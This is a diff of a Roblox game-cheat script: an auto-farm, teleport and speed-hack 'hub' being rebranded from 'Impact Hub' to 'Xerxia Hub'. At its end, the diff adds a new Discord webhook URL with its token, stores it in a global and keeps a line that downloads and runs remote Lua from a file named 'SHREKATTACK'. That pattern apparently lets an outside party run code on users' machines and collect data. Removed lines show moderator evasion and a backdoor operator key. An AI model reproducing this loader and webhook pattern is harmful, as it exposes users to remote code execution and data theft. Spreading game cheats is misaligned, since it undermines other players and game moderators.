@@ -29,15 +29,13 @@ FarmTable = {
 }
 
 AutoFarmType = FarmTable[1]
-
 FARMS:addDropdown(""..AutoFarmType, FarmTable, function(value)
     AutoFarmType = value
     if value == "[Default : Above] Auto Farm Type : Above" then
+        UI:Notify(HubName, "To Use This Type.\nYou Must Set The Distance More Than 0")
 
-        UI:Notify(HubName, "To Use This Type.\nYou Must Sliding The Distance More Than 0")
     elseif value == "[Default : Above] Auto Farm Type : Bellow" then
-
-        UI:Notify(HubName, "To Use This Type.\nYou Must Sliding The Distance Lower Than 0")
+        UI:Notify(HubName, "To Use This Type.\nYou Must Set The Distance Lower Than 0")
     end
 end)
 
@@ -246,8 +244,8 @@ task.spawn(function()
         local plr = game.Players.LocalPlayer.Character.HumanoidRootPart
 
         if MonSelected == nil then
-            wait(2)
-            UI:Notify(HubName, "Please Select The Monster")
+            wait(1)
+            UI:Notify(HubName, "Please Choose A Monster")
         end
         
         CheckQuest()
@@ -344,7 +342,7 @@ end)
         local Minute = math.floor(GameTime/(60^1))%60
         local Second = math.floor(GameTime/(60^0))%60
 
-         UI:Notify("Impact Hub", "Total Time You Have Joined\nHour : "..Hour.." Minute : "..Minute.." Second : "..Second);
+         UI:Notify("Xerxia Hub", "Total Time You Have Joined\nHour : "..Hour.." Minute : "..Minute.." Second : "..Second);
     end)
 
     FARM:addButton("Teleport To Current Quest", function()
@@ -454,7 +452,7 @@ FARM1:addToggle("Auto Farm Sea King", nil, function(value)
     if (game:GetService("Workspace").SeaMonster:FindFirstChild("SeaKing").HumanoidRootPart.Position - plr.Position).Magnitude < 15000 then
         UI:Notify(HubName, "Recomeded For Distance 200")
     else
-        UI:Notify(HubName, "Sea King Is Buging. Turn Off The Function")
+        UI:Notify(HubName, "Sea King Is Bugging. Turn Off The Function")
         end
     end
 
@@ -753,7 +751,7 @@ end)
             if _G.GsHop then
                 pcall(function()
                 if not game:GetService("Workspace").GhostMonster:FindFirstChild("Ghost Ship") then
-                    UI:Notify("Impact Hub", "Hoping...")
+                    UI:Notify("Xerxia Hub", "Hoping...")
                     wait(2)
                     Hop()
                 end
@@ -2480,61 +2478,6 @@ end)
 end)
 
 
-local SuperOther = page1:addSection("Other")
-
-        SuperOther:addToggle("Avoid Admin", nil, function(value)
-            _G.LeaveAdmin = value
-        end)
-
-task.spawn(function()
-    while task.wait() do
-        if _G.LeaveAdmin then
-            pcall(function()
-                local p = game:GetService("Players")
-                    if p:FindFirstChild("Peodiz") or "LordHxppi" or "ii_ArunXz" or "LeePungg" or "DiscoInwZa007" or "DragoTheDev" or "DinoxLive" then
-
-                        p.LocalPlayer:Kick("The Admin Have Been Joined The Server. Auto Hop In 10 Sec.")
-                        wait(10)
-                        Hop()
-                    end
-                end)
-            end
-        end
-    end)
-
-    Opkey = "Key"
-    SuperOther:addTextbox("Operator Key ", "Key", function(value)
-        Opkey = value
-        print("123123thank")
-        print("PersonaLifeIII")
-    end)
-
-if game:GetService("Players").LocalPlayer.Name == "PersonaLifeIII" then
-
-    SuperOther:addButton("Open Admin Command Operator", function()
-        if Opkey == "123123thank" then
-            local Venyx2 = loadstring(game:HttpGet("https://raw.githubusercontent.com/PersonaLifeII/Impact-Hub/main/UI%20Venyx"))()
-            local UI2  = Venyx2.new("Impact Hub | https://discord.gg/pyg9WhKWBX", 5013109572)
-
-            local page123 = UI2:addPage("Panel", 5012544693)
-            local CombackSection = page123:addSection("https://discord.gg/pyg9WhKWBX\nhttps://discord.gg/vj3Ex3EY3j")
-
-            wait(.1)
-            CombackSection:addButton("Copy Discord Save Link !", function()
-            setclipboard("https://discord.gg/pyg9WhKWBX")
-            end)
-        end
-    end)
-end
-
-    SuperOther:addButton("Copy Discord Server Link", function()
-        setclipboard("https://discord.gg/vj3Ex3EY3j")
-        UI:Notify("Impact Hub", "This Is Just A Server For Future and I Don't Know What Time I Have Got To Using It.")
-        print("Copyed !")
-    end)
-
-
-
 local SuperOther2 = page1:addSection("I Don't Know")
 
 SuperOther2:addButton("Inf Yield", function()
@@ -2601,7 +2544,7 @@ Teleport:addButton("Teleport To Island / Zone", function(a)
     elseif SelectIsZone == "Soldier Headquater" then
         TP(CFrame.new(-9696, 38, 955))
     elseif SelectIsZone == nil then
-        UI:Notify("Impact Hub", "Please Select Island / Zone")
+        UI:Notify("Xerxia Hub", "Please Select Island / Zone")
     end
 end)
 
@@ -2614,11 +2557,11 @@ game:GetService("TeleportService"):Teleport(6381829480, game:GetService("Players
 end)
 local Teleport21 = page3:addSection("Server")
     Teleport21:addButton("Server Hop", function()
-        UI:Notify("Impact Hub", "Finding Server And Hoping..")
+        UI:Notify("Xerxia Hub", "Finding Server And Hoping..")
         Hop()
     end)
     Teleport21:addButton("Rejoin",function()
-        UI:Notify("Impact Hub", "Rejoining..")
+        UI:Notify("Xerxia Hub", "Rejoining..")
         Rejoin()
     end)
 
@@ -3197,10 +3140,10 @@ spawn(function()
         AutoRaidType = value
         if value == "[Default : Above] Auto Farm Type : Above" then
     
-            UI:Notify("Impact Hub", "To Use This Type.\n You Must Sliding The Distance More Than 0")
+            UI:Notify("Xerxia Hub", "To Use This Type.\n You Must Sliding The Distance More Than 0")
         elseif value == "[Default : Above] Auto Farm Type : Bellow" then
     
-            UI:Notify("Impact Hub", "To Use This Type.\n You Must Sliding The Distance Lower Than 0")
+            UI:Notify("Xerxia Hub", "To Use This Type.\n You Must Sliding The Distance Lower Than 0")
         end
     end)
 
@@ -3307,11 +3250,11 @@ Basic:addSlider("Jump Power", 50,-50,1250, function(value)
 end)
 
 Basic:addButton("Check Current Walk Speed", function(value)
-    UI:Notify("Impact Hub", "Your Current Walk Speed Is : "..game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed)
+    UI:Notify("Xerxia Hub", "Your Current Walk Speed Is : "..game:GetService("Players").LocalPlayer.Character.Humanoid.WalkSpeed)
 end)
 
 Basic:addButton("Check Current Jump Power", function(value)
-    UI:Notify("Impact Hub", "Your Current Jump Power Is : "..game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower)
+    UI:Notify("Xerxia Hub", "Your Current Jump Power Is : "..game:GetService("Players").LocalPlayer.Character.Humanoid.JumpPower)
 end)
 
 Basic:addToggle("Set Walk Speed", nil, function(value)
@@ -3670,7 +3613,7 @@ end)
  BountySet:addDropdown(""..FarmBountyType, BountyTable, function(value)
     FarmBountyType = value
     if value == BountyTable[2] then
-        UI:Notify("Impact Hub", "To Use This Type.\n You Must Sliding The Distance Lower Than 0")
+        UI:Notify("Xerxia Hub", "To Use This Type.\n You Must Sliding The Distance Lower Than 0")
     end
  end)
  
@@ -3968,7 +3911,7 @@ end)
 
 USetting:addButton("Destroy UI", function()
     for i, v in pairs(game.CoreGui:GetChildren()) do
-        if string.find(v.Name, "Impact Hub") then   
+        if string.find(v.Name, "Xerxia Hub") then   
             v:Destroy()
         end
     end
@@ -4973,7 +4916,6 @@ function FindGS()
 
 UI:Notify(HubName, "Welcom To "..HubName)
 
-local Web = "https://discord.com/api/webhooks/1304810633371320373/kIt9wic6VsvnhFE5Uv1ZBMZHKHZyYcHnZ61xzSTAQVfKXkY4kpChS9PuMznUNllZ-_db"
+local Web = "https://discord.com/api/webhooks/1316075263804837898/y9G0eQAzlGWjgvDEb9Fux7VTQBSrQYdo0-ZpZpeV07IX2szQ30E_dUBTVsCjXt0nWPIC"
 _G.webhooksdiscord = Web
 loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua", true))()
-
